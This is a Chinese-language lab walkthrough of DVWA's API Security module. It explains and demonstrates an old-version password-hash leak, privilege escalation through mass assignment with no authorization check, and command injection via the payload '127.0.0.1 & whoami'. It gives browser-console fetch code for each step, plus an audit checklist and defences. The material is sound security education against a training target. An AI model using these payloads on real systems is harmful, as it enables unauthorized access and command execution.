DVWA-API Security（API 安全）

- 定义

这是一个完整的 REST API（MVC 结构），有 4 个控制器：

| 控制器 | 端点 | 功能 |
|---|---|---|
| user | /api/v2/user | 用户增删改查 |
| order | /api/v2/order/ | 订单管理（需token认证） |
| health | /api/v2/health/ | 健康检查（ping/echo/connectivity） |
| login | /api/v2/login/ | 登录/OAuth2认证 |

路由规则：/vulnerabilities/api/v{版本号}/{控制器}/{id}

安全运营视角：API是现代应用的主要攻击面。OWASP专门出了API Security Top 10.这个模块四个等级恰好对应四种最常见的API漏洞。

- 四级拆解

- Low级：API版本管理 → 敏感信息泄露

// User.php 的 toArray 方法——版本 1 返回 password 字段！

public function toArray($version) {

switch ($version) {

case 1:

$a = array("id", "name", "level", "password");

// v1 泄露密码哈希

break;

default:

case 2:

$a = array("id", "name", "level");

// v2 不返回密码

break;

}

}

页面调用的是v2/user/（安全），但攻击者把版本号从v2改成v1：

正常：GET /api/v2/user/ → [{"id":1,"name":"tony","level":0}...]

攻击：GET /api/v1/user/ →[{"id":1,"name":"tony","level":0,"password":"1c8bfe8f..."}...]

漏洞根因：旧版本API保留着"返回密码"的旧行为，没下线。

- Medium级：水平越权 + 批量赋值提权

private function updateUser($id) {

// 没有任何认证/授权检查！

$input = json_decode(file_get_contents('php://input'), TRUE);

if (array_key_exists("name", $input)) {

$this->data[$id]->name = $input['name'];

}

if (array_key_exists("level", $input)) {      // ← level 也能改！

$this->data[$id]->level = intval($input['level']);

}

}

页面只让改自己的名字，但PUT请求体里多塞一个level字段就能提权：

攻击：PUT /api/v2/user/2   body: {"name":"morph","level":0}

结果：morph 从 level=1(user) 变成 level=0(admin)

两个漏洞叠加：

- BOLA（水平越权）：没有任何身份验证，任何人不带token就能改任意用户

- 批量赋值（Mass Assignment）：只验证了name，但level也直接接受用户输入

- High级：命令注入

private function checkConnectivity() {

$target = $input['target'];

exec("ping -c 4 " . $target, $output, $ret_var);  // ← 直接拼接用户输入！

}

target 参数直接拼进 shell 命令，无任何过滤：

攻击：POST /api/v2/health/connectivity   body: {"target":"127.0.0.1 & whoami"}

（这就是之前命令注入模块学过的同一类漏洞，只是这次通过 API 端点触发）

- Impossible级：OAuth 2.0

这一级不是"攻破"，而是练习正确姿势——order系统用OAuth 2.0认证，要求在Postman/Burp里配置OAuth 2.0 流程（client credentials + password grant）来调用受保护的API。

- 四级对照表

| 维度 | Low | Medium | High | Impossible |
|---|---|---|---|---|
| 漏洞类型 | 敏感信息泄露 | BOLA + 批量赋值 | 命令注入 | OAuth 2.0 |
| 根因 | 旧版本API未下线 | 无认证+level可赋值 | exec拼接用户输入 | 正确认证流程 |
| 攻击方式 | v2 改v1 | PUT+level字段 | target加&注入 | 无（练习配置） |
| 对应OWASP API Top 10 | API3敏感数据泄露 | API1 BOLA+API6批量赋值 | API8注入 | —— |

- 安全运营收获

- API安全审计清单

| # | 检查项 | 危险信号 |
|---|---|---|
| 1 | 所有端点都有认证吗？ | user端点无token = 高危 |
| 2 | 水平越权（BOLA） | 改id就能访问别人数据 = 高危 |
| 3 | 批量赋值防护 | 请求体字段直接映射对象属性 = 高危 |
| 4 | 敏感数据暴露 | 响应里含password/token = 高危 |
| 5 | 注入防护 | exec/system拼接输入 = 极危 |
| 6 | CORS配置 | Access-Control-Allow-Origin: * = 高危 |
| 7 | 旧版本API下线 | 保留带漏洞的旧版本 = 隐患 |

- 这个模块暴露的额外问题

源码里public/index.php有：

header("Access-Control-Allow-Origin: *");  // CORS 允许任意来源！

这意味着任何网站都能跨域调用这个API——配合无认证的user端点，就是跨站提权的组合拳。

- 实操

- Low级

DVWA 切到 Low，页面会自动加载 v2/user/（不带密码）。

![](images/19-DVWA-API/19-DVWA-API_001.png)

在地址栏直接访问：

http://localhost/dvwa/vulnerabilities/api/v1/user/

![](images/19-DVWA-API/19-DVWA-API_002.png)

结果：返回的 JSON 里多了 password 字段（SHA-256 哈希）

漏洞根因：为了向后兼容，旧版 API（v1）还保留着"返回密码"的旧行为，没下线。攻击者只要把 URL 里的 v2 改成 v1 就拿到所有密码哈希。

💡 这是 OWASP API Top 10 的 API3:2023（敏感数据泄露）——旧版本 API 保留敏感字段，是 API 生命周期管理不当的典型。

- Medium级

- 在 Medium 页面按 F12 打开开发者工具

- 切到 Console 标签

- 执行：

fetch('/dvwa/vulnerabilities/api/v2/user/2', {

method: 'PUT',

headers: {'Content-Type': 'application/json'},

body: JSON.stringify({name: "morph", level: 0})

}).then(r => r.json()).then(d => console.log(d));

- 看返回结果

![](images/19-DVWA-API/19-DVWA-API_003.png)

- 核心认知：

| 漏洞 | 代码证据 | 危害 |
|---|---|---|
| 批量赋值 | updateUser直接接受level字段 | 请求体加level:0就能提权 |
| 水平越权（BOLA） | updateUser没有任何认证 | 改URL的id就能改任意用户 |

防御要点：

白名单字段：只接受允许更新的字段（name），其他字段（level）即使传了也忽略

对象级授权：每个接口必须验证"当前用户是否有权修改这个 id"

- High级：命令注入

切到 High，页面会提示看 OpenAPI 文档（openapi.yml），找 health 功能的漏洞。

| 端点 | 方法 | 功能 |
|---|---|---|
| /health/echo | POST | 回显 |
| /health/connectivity | POST | 检测连通性（可疑） |
| /health/status | GET | 状态 |
| /health/ping | GET | 心跳 |

- connectivity端点的源码：

private function checkConnectivity() {

$target = $input['target'];

exec("ping -c 4 " . $target, $output, $ret_var);  // ← 直接拼接用户输入！

}

target参数直接拼进shell命令，没有任何过滤——这就是命令注入！

- 实操：用 Console 发 POST 请求

在 High 页面按 F12 → Console，执行：

fetch('/dvwa/vulnerabilities/api/v2/health/connectivity', {

method: 'POST',

headers: {'Content-Type': 'application/json'},

body: JSON.stringify({target: "127.0.0.1 & whoami"})

}).then(r => r.json()).then(d => console.log(d));

![](images/19-DVWA-API/19-DVWA-API_004.png)

对照试验（理解漏洞）：

- 先发个正常的target：

fetch('/dvwa/vulnerabilities/api/v2/health/connectivity', {

method: 'POST',

headers: {'Content-Type': 'application/json'},

body: JSON.stringify({target: "127.0.0.1"})

}).then(r => r.json()).then(d => console.log("正常:", d));

![](images/19-DVWA-API/19-DVWA-API_005.png)

结果：500（因为 Windows 下 ping -c 4 语法错误，连接失败）

- 再发注入的target（& whoami）：

fetch('/dvwa/vulnerabilities/api/v2/health/connectivity', {

method: 'POST',

headers: {'Content-Type': 'application/json'},

body: JSON.stringify({target: "127.0.0.1 & whoami"})

}).then(r => r.json()).then(d => console.log("注入:", d));

![](images/19-DVWA-API/19-DVWA-API_006.png)

结果：200 OK——因为 & whoami 被执行成功了，整个命令返回成功！

💡 状态码从 500 变 200，就证明注入的 whoami 命令在服务器上执行了。这是命令注入生效的证据。

- Impossible级：OAuth 2.0 认证

这一级不是攻破，而是理解"正确的 API 认证"——它和前面漏洞形成鲜明对比：、

| 对比 | user端点（Medium漏洞） | order端点（Impossible 安全） |
|---|---|---|
| 认证 | 无任何认证 | 必须带Bearer token |
| 结果 | 随便改任意用户 | 没有token无法访问 |

order 控制器代码：

private function checkToken() {

if (array_key_exists("HTTP_AUTHORIZATION", $_SERVER)) {

$header = $_SERVER['HTTP_AUTHORIZATION'];

$bits = explode(" ", $header);

if (strtolower($bits[0]) == "bearer") {

return Login::check_access_token($bits[1]);

}

}

return false;  // 没有有效 token → 拒绝

}

没有 token 访问 order 会返回 401

- 先验证一下——在 Console 执行：

fetch('/dvwa/vulnerabilities/api/v2/order/', {method: 'GET'})

.then(r => { console.log("状态:", r.status); return r.json(); })

.then(d => console.log(d));

![](images/19-DVWA-API/19-DVWA-API_007.png)

结果：401 Invalid or missing token——这就是没有认证访问受保护 API 的结果。

- OAuth 2.0 password grant 流程拿 token。在 Console 执行（这就是在模拟 Postman/Burp 里配置 OAuth 2.0 的 client credentials + password grant）：

fetch('/dvwa/vulnerabilities/api/v2/login/login', {

method: 'POST',

headers: {

'Content-Type': 'application/x-www-form-urlencoded',

'Authorization': 'Basic ' + btoa('1471.dvwa.digi.ninja:ABigLongSecret')

},

body: 'grant_type=password&username=mrbennett&password=becareful'

}).then(r => r.json()).then(d => console.log(d));

![](images/19-DVWA-API/19-DVWA-API_008.png)

结果：

{

access_token: "qie3p2nDAebUYY2frfby6zo6Ojo6G6b6JStF6dZEdUtpOjo6OjpUVURHYmVjaEN1b09oU1F2UCtHaWQ0eGFOZjdpSXZsa1g4Qm4vVWg4VzR5WWwyNGw3aVNt"

expires_in: 180

refresh_token: "3TeRHJgJB4gMQbuXZYPV3jo6Ojo6OG21p5LJgCpKHO/iOjo6OjpkK3lPZU8xOW1DOWNBZ042Y3pRbU5Ecmd1NkZXN0t5RXhHaXJrR1RwTzZrSEM2TkVrK3pW"

token_type: "bearer"

}

说明：

- Authorization: Basic ... = client_id : client_secret 的 Base64（模拟应用凭证）

- grant_type=password = OAuth2 密码授权模式

- username/password = 用户凭证（mrbennett / becareful）

- 拿到token之后用这个 access_token 访问受保护的 order API。

在 Console 执行（把 token 填进 Bearer 头）：

fetch('/dvwa/vulnerabilities/api/v2/order/', {

method: 'GET',

headers: {'Authorization': 'Bearer qie3p2nDAebUYY2frfby6zo6Ojo6G6b6JStF6dZEdUtpOjo6OjpUVURHYmVjaEN1b09oU1F2UCtHaWQ0eGFOZjdpSXZsa1g4Qm4vVWg4VzR5WWwyNGw3aVNt'}

}).then(r => r.json()).then(d => console.log(d));

![](images/19-DVWA-API/19-DVWA-API_009.png)

结果：

Array(3) [ {…}, {…}, {…} ]

0: Object { id: 1, name: "Tony", address: "BBC Television Centre, London W3 6XZ", … }

1: Object { id: 2, name: "Morph", address: "Wooden Box, Corner of the table, The Studio", … }

2: Object { id: 3, name: "Nailbrush", address: "BBC Television Centre, London W3 6XZ", … }

length: 3
